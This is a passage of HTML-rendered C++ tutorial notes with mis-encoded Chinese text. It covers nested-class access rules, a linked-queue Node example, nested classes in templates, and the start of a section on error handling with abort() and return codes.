class="function"><span class="keyword">void</span> <span class="title">accessEnclosing</span><span class="params">(EnclosingClass&amp; enc)</span></span>;</span><br><span class="line">        <span class="function"><span class="keyword">int</span> <span class="title">getData</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> nestedData; &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> enclosingData;</span><br><span class="line">    NestedClassPrivate ncp; <span class="comment">// å¯ä»¥åˆ›å»ºåµŒå¥—ç±»å¯¹è±¡ä½œä¸ºæˆå‘˜</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    EnclosingClass(<span class="keyword">int</span> data = <span class="number">0</span>) : enclosingData(data) &#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">useNested</span><span class="params">(NestedClassPublic&amp; ncp)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getData</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> enclosingData; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åµŒå¥—ç±»æˆå‘˜å‡½æ•°çš„å®šä¹‰</span></span><br><span class="line"><span class="keyword">void</span> EnclosingClass::NestedClassPublic::accessEnclosing(EnclosingClass&amp; enc) &#123;</span><br><span class="line">    <span class="comment">// åµŒå¥—ç±»å¯ä»¥è®¿é—®å¤–å›´ç±»çš„æ‰€æœ‰æˆå‘˜ (é€šè¿‡å¯¹è±¡/æŒ‡é’ˆ/å¼•ç”¨)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Accessing enclosing data: &quot;</span> &lt;&lt; enc.enclosingData &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// enc.ncp; // å¯ä»¥è®¿é—®å¤–å›´ç±»çš„ç§æœ‰æˆå‘˜å¯¹è±¡</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¤–å›´ç±»æˆå‘˜å‡½æ•°çš„å®šä¹‰</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">EnclosingClass::useNested</span><span class="params">(NestedClassPublic&amp; ncp)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// å¤–å›´ç±»å¯ä»¥è®¿é—®åµŒå¥—ç±»çš„ public æˆå‘˜</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Using nested data: &quot;</span> &lt;&lt; ncp.getData() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; ncp.nestedData; // é”™è¯¯ï¼ä¸èƒ½ç›´æ¥è®¿é—®åµŒå¥—ç±»çš„ private æˆå‘˜</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="15-2-1-åµŒå¥—ç±»å’Œè®¿é—®æƒé™"><a href="#15-2-1-åµŒå¥—ç±»å’Œè®¿é—®æƒé™" class="headerlink" title="15.2.1 åµŒå¥—ç±»å’Œè®¿é—®æƒé™"></a>15.2.1 åµŒå¥—ç±»å’Œè®¿é—®æƒé™</h3><p>åµŒå¥—ç±»çš„è®¿é—®æƒé™éµå¾ªä»¥ä¸‹è§„åˆ™ï¼š</p><ol><li><p><strong>ä½œç”¨åŸŸ:</strong></p><ul><li>  åµŒå¥—ç±»çš„åç§°<strong>ä½œç”¨åŸŸ</strong>ä»…é™äºå…¶å¤–å›´ç±»ã€‚åœ¨å¤–éƒ¨å¼•ç”¨åµŒå¥—ç±»æ—¶ï¼Œå¿…é¡»ä½¿ç”¨å¤–å›´ç±»çš„åç§°å’Œä½œç”¨åŸŸè§£æè¿ç®—ç¬¦ (<code>::</code>)ï¼Œä¾‹å¦‚ <code>EnclosingClass::NestedClassPublic</code>ã€‚</li><li>åµŒå¥—ç±»çš„å£°æ˜ä½ç½®ï¼ˆ<code>public</code>, <code>protected</code>, <code>private</code>ï¼‰å†³å®šäº†å¤–éƒ¨ä»£ç æ˜¯å¦ä»¥åŠå¦‚ä½•èƒ½å¤Ÿå¼•ç”¨è¯¥åµŒå¥—ç±»ç±»å‹æœ¬èº«ã€‚<ul><li>  <code>public</code>: å¤–éƒ¨ä»£ç å¯ä»¥ä½¿ç”¨ <code>EnclosingClass::NestedClassPublic</code>ã€‚</li><li>  <code>protected</code>: åªæœ‰ <code>EnclosingClass</code> åŠå…¶æ´¾ç”Ÿç±»å¯ä»¥ä½¿ç”¨ <code>EnclosingClass::NestedClassProtected</code>ã€‚</li><li>  <code>private</code>: åªæœ‰ <code>EnclosingClass</code> å†…éƒ¨å¯ä»¥ä½¿ç”¨ <code>NestedClassPrivate</code>ã€‚</li></ul></li></ul></li><li><p><strong>åµŒå¥—ç±»å¯¹å¤–å›´ç±»çš„è®¿é—®:</strong></p><ul><li>  åµŒå¥—ç±»çš„æˆå‘˜å‡½æ•°å¯ä»¥è®¿é—®å¤–å›´ç±»çš„<strong>æ‰€æœ‰</strong>æˆå‘˜ï¼ˆ<code>public</code>, <code>protected</code>, <code>private</code>ï¼‰ï¼ŒåŒ…æ‹¬ç±»å‹åã€é™æ€æˆå‘˜ã€æšä¸¾å¸¸é‡ç­‰ã€‚</li><li>  <strong>é‡è¦:</strong> åµŒå¥—ç±»è®¿é—®å¤–å›´ç±»çš„éé™æ€æˆå‘˜æ—¶ï¼Œ<strong>å¿…é¡»</strong>é€šè¿‡å¤–å›´ç±»çš„å¯¹è±¡ã€æŒ‡é’ˆæˆ–å¼•ç”¨æ¥è¿›è¡Œã€‚åµŒå¥—ç±»å¯¹è±¡æœ¬èº«<strong>ä¸</strong>åŒ…å«ä¸€ä¸ªæŒ‡å‘å…¶å¤–å›´ç±»å¯¹è±¡çš„éšå¼æŒ‡é’ˆï¼ˆä¸åƒ Java çš„å†…éƒ¨ç±»ï¼‰ã€‚</li></ul></li><li><p><strong>å¤–å›´ç±»å¯¹åµŒå¥—ç±»çš„è®¿é—®:</strong></p><ul><li>  å¤–å›´ç±»çš„æˆå‘˜å‡½æ•°å¯ä»¥åˆ›å»ºåµŒå¥—ç±»çš„å¯¹è±¡ã€‚</li><li>  å¤–å›´ç±»å¯¹å…¶åµŒå¥—ç±»çš„æˆå‘˜çš„è®¿é—®æƒé™ï¼Œéµå¾ªåµŒå¥—ç±»è‡ªèº«çš„è®¿é—®æ§åˆ¶è§„åˆ™ï¼ˆ<code>public</code>, <code>protected</code>, <code>private</code>ï¼‰ã€‚ä»…ä»…å› ä¸ºä¸€ä¸ªç±»æ˜¯åµŒå¥—çš„ï¼Œå¹¶<strong>ä¸</strong>æ„å‘³ç€å¤–å›´ç±»å¯ä»¥æ— è§†å…¶è®¿é—®æ§åˆ¶ã€‚å¤–å›´ç±»<strong>ä¸èƒ½</strong>ç›´æ¥è®¿é—®åµŒå¥—ç±»çš„ <code>private</code> æˆå‘˜ï¼ˆé™¤éå¤–å›´ç±»æ˜¯åµŒå¥—ç±»çš„å‹å…ƒï¼‰ã€‚</li></ul></li></ol><p><strong>ç¤ºä¾‹ï¼šé“¾å¼é˜Ÿåˆ—ä¸­çš„ Node åµŒå¥—ç±»</strong></p><p>å›é¡¾ç¬¬ 12 ç« çš„é˜Ÿåˆ—æ¨¡æ‹Ÿï¼Œ<code>Queue</code> ç±»å†…éƒ¨å®šä¹‰äº†ä¸€ä¸ª <code>Node</code> ç»“æ„ã€‚è¿™å°±æ˜¯ä¸€ä¸ªå…¸å‹çš„åµŒå¥—ç±»ï¼ˆæˆ–ç»“æ„ï¼‰åº”ç”¨ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// queue.h (éƒ¨åˆ†)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> QUEUE_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QUEUE_H_</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Customer</span>;</span> <span class="comment">// å‰å‘å£°æ˜</span></span><br><span class="line"><span class="keyword">typedef</span> Customer Item;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Queue</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">// åµŒå¥—ç»“æ„ Node (ä½œç”¨åŸŸåœ¨ Queue å†…)</span></span><br><span class="line">    <span class="comment">// è®¾ä¸º privateï¼Œå› ä¸ºå®ƒæ˜¯ Queue çš„å®ç°ç»†èŠ‚</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">        Item item;</span><br><span class="line">        Node * next;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> &#123;</span> Q_SIZE = <span class="number">10</span> &#125;;</span><br><span class="line"></span><br><span class="line">    Node * front; <span class="comment">// æŒ‡å‘ Node å¯¹è±¡çš„æŒ‡é’ˆ</span></span><br><span class="line">    Node * rear;</span><br><span class="line">    <span class="keyword">int</span> items;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> qsize;</span><br><span class="line">    <span class="comment">// ... (ç¦æ­¢èµ‹å€¼) ...</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Queue(<span class="keyword">int</span> qs = Q_SIZE);</span><br><span class="line">    ~Queue();</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isempty</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isfull</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">queuecount</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">enqueue</span><span class="params">(<span class="keyword">const</span> Item &amp;item)</span></span>; <span class="comment">// Queue çš„æ–¹æ³•å¯ä»¥åˆ›å»ºå’Œè®¿é—® Node å¯¹è±¡</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">dequeue</span><span class="params">(Item &amp;item)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// queue.cpp (éƒ¨åˆ†)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;queue.h&quot;</span></span></span><br><span class="line"><span class="comment">// ... Customer å®šä¹‰ ...</span></span><br><span class="line"></span><br><span class="line">Queue::Queue(<span class="keyword">int</span> qs) : qsize(qs) &#123;</span><br><span class="line">    front = rear = <span class="literal">nullptr</span>;</span><br><span class="line">    items = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Queue::~Queue() &#123;</span><br><span class="line">    Node * temp; <span class="comment">// å¯ä»¥å£°æ˜ Node ç±»å‹çš„æŒ‡é’ˆ</span></span><br><span class="line">    <span class="keyword">while</span> (front != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">        temp = front;</span><br><span class="line">        front = front-&gt;next; <span class="comment">// å¯ä»¥è®¿é—® Node çš„æˆå‘˜ (å› ä¸º Node æ˜¯ Queue çš„åµŒå¥—ç±»ï¼Œä¸”æˆå‘˜é»˜è®¤ public)</span></span><br><span class="line">        <span class="keyword">delete</span> temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Queue::enqueue</span><span class="params">(<span class="keyword">const</span> Item &amp;item)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (isfull())</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    Node * add = <span class="keyword">new</span> Node; <span class="comment">// å¯ä»¥åˆ›å»º Node å¯¹è±¡</span></span><br><span class="line">    add-&gt;item = item;      <span class="comment">// å¯ä»¥è®¿é—® Node çš„æˆå‘˜</span></span><br><span class="line">    add-&gt;next = <span class="literal">nullptr</span>;</span><br><span class="line">    items++;</span><br><span class="line">    <span class="keyword">if</span> (front == <span class="literal">nullptr</span>)</span><br><span class="line">        front = add;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        rear-&gt;next = add;</span><br><span class="line">    rear = add;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ... dequeue å®ç°ç±»ä¼¼ ...</span></span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼š</p><ul><li>  <code>Node</code> çš„ä½œç”¨åŸŸä»…é™äº <code>Queue</code> ç±»ã€‚å¤–éƒ¨ä»£ç ä¸èƒ½ç›´æ¥ä½¿ç”¨ <code>Node</code> ç±»å‹ã€‚</li><li>  <code>Queue</code> çš„æˆå‘˜å‡½æ•°ï¼ˆå¦‚æ„é€ å‡½æ•°ã€ææ„å‡½æ•°ã€<code>enqueue</code>ï¼‰å¯ä»¥è‡ªç”±åœ°åˆ›å»º <code>Node</code> å¯¹è±¡ï¼Œå¹¶è®¿é—®å…¶æˆå‘˜ <code>item</code> å’Œ <code>next</code>ï¼ˆå› ä¸º <code>struct</code> æˆå‘˜é»˜è®¤æ˜¯ <code>public</code> çš„ï¼Œå¹¶ä¸” <code>Node</code> åœ¨ <code>Queue</code> çš„ä½œç”¨åŸŸå†…ï¼‰ã€‚</li></ul><h3 id="15-2-2-æ¨¡æ¿ä¸­çš„åµŒå¥—"><a href="#15-2-2-æ¨¡æ¿ä¸­çš„åµŒå¥—" class="headerlink" title="15.2.2 æ¨¡æ¿ä¸­çš„åµŒå¥—"></a>15.2.2 æ¨¡æ¿ä¸­çš„åµŒå¥—</h3><p>åµŒå¥—ç±»ä¹Ÿå¯ä»¥åœ¨ç±»æ¨¡æ¿ä¸­å®šä¹‰ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OuterTemplate</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    T outerData;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// åµŒå¥—ç±»</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Nested</span> &#123;</span></span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        <span class="keyword">int</span> nestedData;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="comment">// åµŒå¥—ç±»çš„æˆå‘˜å‡½æ•°å¯ä»¥è®¿é—®å¤–å›´æ¨¡æ¿ç±»çš„æˆå‘˜</span></span><br><span class="line">        <span class="comment">// (éœ€è¦é€šè¿‡å¤–å›´ç±»å¯¹è±¡)</span></span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">processOuter</span><span class="params">(OuterTemplate&lt;T&gt;&amp; outer)</span> </span>&#123;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Outer data: &quot;</span> &lt;&lt; outer.outerData &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">            <span class="comment">// outer.outerData = someValue; // å¯ä»¥ä¿®æ”¹</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    Nested nestedObj; <span class="comment">// å¤–å›´ç±»å¯ä»¥åŒ…å«åµŒå¥—ç±»å¯¹è±¡</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    OuterTemplate(<span class="keyword">const</span> T&amp; data) : outerData(data) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">useNested</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        nestedObj.processOuter(*<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½¿ç”¨</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function">OuterTemplate&lt;<span class="keyword">double</span>&gt; <span class="title">ot</span><span class="params">(<span class="number">3.14</span>)</span></span>;</span><br><span class="line">    ot.useNested(); <span class="comment">// è¾“å‡º Outer data: 3.14</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¼•ç”¨åµŒå¥—ç±»ç±»å‹éœ€è¦å¤–å›´ç±»æ¨¡æ¿å®ä¾‹åŒ–</span></span><br><span class="line">    OuterTemplate&lt;<span class="keyword">double</span>&gt;::Nested nestedInstance;</span><br><span class="line">    <span class="comment">// nestedInstance.processOuter(ot); // ä¹Ÿå¯ä»¥ç›´æ¥è°ƒç”¨</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>  å½“å¤–å›´ç±»æ˜¯æ¨¡æ¿æ—¶ï¼ŒåµŒå¥—ç±»çš„å®šä¹‰é€šå¸¸ä¹Ÿä¾èµ–äºå¤–å›´ç±»çš„æ¨¡æ¿å‚æ•°ï¼ˆå¦‚ <code>Nested</code> å¯ä»¥è®¿é—® <code>outerData</code>ï¼Œå…¶ç±»å‹ä¸º <code>T</code>ï¼‰ã€‚</li><li>  åœ¨å¤–éƒ¨å¼•ç”¨åµŒå¥—ç±»ç±»å‹æ—¶ï¼Œéœ€è¦æŒ‡å®šå¤–å›´æ¨¡æ¿ç±»çš„å…·ä½“å®ä¾‹åŒ–ç±»å‹ï¼Œä¾‹å¦‚ <code>OuterTemplate&lt;double&gt;::Nested</code>ã€‚</li></ul><p><strong>æ€»ç»“:</strong></p><ul><li>  åµŒå¥—ç±»æ˜¯åœ¨å¦ä¸€ä¸ªç±»ï¼ˆå¤–å›´ç±»ï¼‰å†…éƒ¨å®šä¹‰çš„ç±»ã€‚</li><li>  åµŒå¥—ç±»çš„ä½œç”¨åŸŸå±€é™äºå¤–å›´ç±»ã€‚</li><li>  åµŒå¥—ç±»å¯ä»¥è®¿é—®å¤–å›´ç±»çš„æ‰€æœ‰æˆå‘˜ï¼ˆé€šè¿‡å¯¹è±¡ã€æŒ‡é’ˆæˆ–å¼•ç”¨ï¼‰ã€‚</li><li>  å¤–å›´ç±»è®¿é—®åµŒå¥—ç±»æˆå‘˜æ—¶ï¼Œå—åµŒå¥—ç±»è‡ªèº«è®¿é—®æ§åˆ¶çš„é™åˆ¶ã€‚</li><li>  åµŒå¥—ç±»å¸¸ç”¨äºå®ç°ä¸å¤–å›´ç±»ç´§å¯†ç›¸å…³çš„è¾…åŠ©æ•°æ®ç»“æ„æˆ–åŠŸèƒ½ï¼Œæœ‰åŠ©äºå°è£…å®ç°ç»†èŠ‚ã€‚</li><li>  åµŒå¥—ç±»å¯ä»¥å‡ºç°åœ¨æ™®é€šç±»å’Œç±»æ¨¡æ¿ä¸­ã€‚</li></ul><h2 id="15-3-å¼‚å¸¸"><a href="#15-3-å¼‚å¸¸" class="headerlink" title="15.3 å¼‚å¸¸"></a>15.3 å¼‚å¸¸</h2><p>ç¨‹åºåœ¨è¿è¡Œæ—¶å¯èƒ½ä¼šé‡åˆ°å„ç§é”™è¯¯æˆ–æ„å¤–æƒ…å†µï¼Œä¾‹å¦‚ï¼š</p><ul><li>  ç”¨æˆ·è¾“å…¥æ— æ•ˆæ•°æ®ã€‚</li><li>  è¯•å›¾æ‰“å¼€ä¸€ä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶ã€‚</li><li>  å†…å­˜åˆ†é…å¤±è´¥ (<code>new</code> å¤±è´¥)ã€‚</li><li>  è¿ç®—é”™è¯¯ï¼ˆå¦‚é™¤ä»¥é›¶ï¼‰ã€‚</li></ul><p>å¤„ç†è¿™äº›é—®é¢˜å¯¹äºç¼–å†™å¥å£®çš„ç¨‹åºè‡³å…³é‡è¦ã€‚C++ æä¾›äº†<strong>å¼‚å¸¸å¤„ç† (Exception Handling)</strong> æœºåˆ¶ï¼Œä½œä¸ºä¸€ç§å¼ºå¤§è€Œçµæ´»çš„é”™è¯¯å¤„ç†æ–¹å¼ã€‚</p><p>åœ¨ä»‹ç»å¼‚å¸¸æœºåˆ¶ä¹‹å‰ï¼Œå…ˆçœ‹çœ‹ä¸€äº›ä¼ ç»Ÿçš„é”™è¯¯å¤„ç†æ–¹æ³•åŠå…¶å±€é™æ€§ã€‚</p><h3 id="15-3-1-è°ƒç”¨-abort"><a href="#15-3-1-è°ƒç”¨-abort" class="headerlink" title="15.3.1 è°ƒç”¨ abort()"></a>15.3.1 è°ƒç”¨ abort()</h3><p>æœ€ç®€å•ç²—æš´çš„æ–¹å¼æ˜¯ï¼Œå½“ç¨‹åºæ£€æµ‹åˆ°æ— æ³•å¤„ç†çš„é”™è¯¯æ—¶ï¼Œè°ƒç”¨ <code>abort()</code> å‡½æ•°ï¼ˆå®šä¹‰åœ¨ <code>&lt;cstdlib&gt;</code> æˆ– <code>&lt;stdlib.h&gt;</code> ä¸­ï¼‰ã€‚<code>abort()</code> ä¼šå‘æ“ä½œç³»ç»Ÿå‘é€ä¸€ä¸ªå¼‚å¸¸ç»ˆæ­¢ä¿¡å·ï¼ˆå¦‚ <em>abnormal program termination</em>ï¼‰ï¼Œç«‹å³åœæ­¢ç¨‹åºçš„æ‰§è¡Œã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt; // for abort()</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">hmean</span><span class="params">(<span class="keyword">double</span> a, <span class="keyword">double</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (a == -b) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Error: hmean() arguments a = -b not allowed.\n&quot;</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">abort</span>(); <span class="comment">// ç»ˆæ­¢ç¨‹åº</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2.0</span> * a * b / (a + b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">double</span> result = hmean(<span class="number">10.0</span>, <span class="number">-10.0</span>);</span><br><span class="line">    <span class="comment">// è¿™è¡Œä¸ä¼šæ‰§è¡Œ</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Result: &quot;</span> &lt;&lt; result &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ç¼ºç‚¹:</strong></p><ul><li>  ç¨‹åºçªç„¶ç»ˆæ­¢ï¼Œç”¨æˆ·å¯èƒ½ä¸çŸ¥é“åŸå› ã€‚</li><li>  æ²¡æœ‰æœºä¼šè¿›è¡Œæ¸…ç†å·¥ä½œï¼ˆå¦‚ä¿å­˜æ•°æ®ã€å…³é—­æ–‡ä»¶ã€é‡Šæ”¾èµ„æºï¼‰ã€‚</li></ul><h3 id="15-3-2-è¿”å›é”™è¯¯ç "><a href="#15-3-2-è¿”å›é”™è¯¯ç " class="headerlink" title="15.3.2 è¿”å›é”™è¯¯ç "></a>15.3.2 è¿”å›é”™è¯¯ç </h3><p>ä¸€ç§æ›´å¸¸è§çš„åšæ³•æ˜¯è®©å‡½æ•°åœ¨å‡ºé”™æ—¶è¿”å›ä¸€ä¸ªç‰¹æ®Šçš„é”™è¯¯ç ï¼ˆä¾‹å¦‚ <code>0</code>, <code>-1</code>, <code>false</code> æˆ– <code>nullptr</code>ï¼‰ï¼Œè°ƒç”¨è€…è´Ÿè´£æ£€æŸ¥è¿™ä¸ªè¿”å›å€¼å¹¶é‡‡å–ç›¸åº”æªæ–½ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cerrno&gt; // for errno (C-style error reporting)</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// è¿”å› -1 è¡¨ç¤ºé”™è¯¯</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">process_data</span><span class="params">(<span class="keyword">int</span> input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (input &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        errno = EDOM; <span class="comment">// è®¾ç½®å…¨å±€é”™è¯¯ç  (Domain Error)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;    <span class="comment">// è¿”å›é”™è¯¯ç </span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ... process data ...</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// è¿”å› 0 è¡¨ç¤ºæˆåŠŸ</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (process_data(<span class="number">-5</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (errno == EDOM) &#123;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Error: Invalid input detected.\n&quot;</span>;</span><br><span 